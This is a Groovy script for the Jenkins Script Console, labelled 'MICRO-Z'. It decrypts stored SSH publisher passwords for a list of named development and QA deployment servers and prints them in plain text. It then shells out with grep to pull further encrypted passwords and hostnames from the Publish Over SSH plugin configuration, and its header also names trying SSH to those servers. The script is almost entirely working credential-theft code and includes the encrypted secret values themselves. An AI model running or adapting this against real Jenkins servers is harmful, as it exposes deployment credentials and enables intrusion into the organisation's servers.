// MICRO-Z: Decrypt Jenkins SSH publisher passwords + try SSH to deployment servers
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(3000)
}

// Decrypt Jenkins secrets using Script Console API
println "=== DECRYPTING SSH PUBLISHER PASSWORDS ==="
def encrypted = [
    "CSDEV01-1":       "AQAAABAAAAAQu80z2+IB7HCyH6EqB7CyrqD/8L59GLuNixILnRADawE=",
    "CSQAAPP01-1":     "AQAAABAAAAAQvCfrolDy/ZNokUSuHnrCLCvkuSvvyESOlJo+6Z48AsU=",
    "CSQAAPP02-1":     "AQAAABAAAAAQyev4KTergPPsDf6Mo7tiaOBApz/lPrOCgAw6bhXbaB0=",
    "CSQANGIN01-1":    "AQAAABAAAAAQLA3k+0y8tIEG7CER1Qb/4GMKdft/K0Ffq0iB87nDzlA=",
    "CSQAAMDIN02-1":   "AQAAABAAAAAQYyrZCIEFX8tZldI9rnmmuTW0dGP31ZDwqN0gmMVb8LI=",
    "CSQAAMDIN-2":     "AQAAABAAAAAQdh+MnHnNTeJMaVVjZ2RnzT5faU6Y/k5tR7LfvBF9POU=",
    "CSQATASK01-1":    "AQAAABAAAAAQnZN50DGRx8sMSnEPwLwmhPez3ZxNiNBA5KeoHDPxC1s=",
]

encrypted.each { host, enc ->
    try {
        def secret = hudson.util.Secret.decrypt(enc)
        println "  ${host} => ${secret}"
    } catch (e) {
        println "  ${host} => DECRYPT_FAIL: ${e.message?.take(60)}"
    }
}

println "\n=== ALSO: ALL JENKINS SECRETS VIA Secret.fromString ==="
encrypted.each { host, enc ->
    try {
        def plain = hudson.util.Secret.fromString("{${enc}}").plainText
        println "  ${host} => ${plain}"
    } catch (e) {
        println "  ${host} => FAIL2: ${e.message?.take(60)}"
    }
}

println "\n=== CSQATASK02-3 and other servers from config ==="
def moreEnc = run('grep -A4 "BapSshHostConfiguration" /var/jenkins_home/jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml 2>/dev/null | grep -E "name|hostname|secretPassword" | head -60')
println moreEnc

println "\n=== FULL HOST LIST ==="
def hosts = run("grep -E '<name>|<hostname>' /var/jenkins_home/jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml 2>/dev/null | sed 's/<[^>]*>//g' | tr -d ' ' | head -40")
println hosts

println "=== DONE MICRO-Z ==="
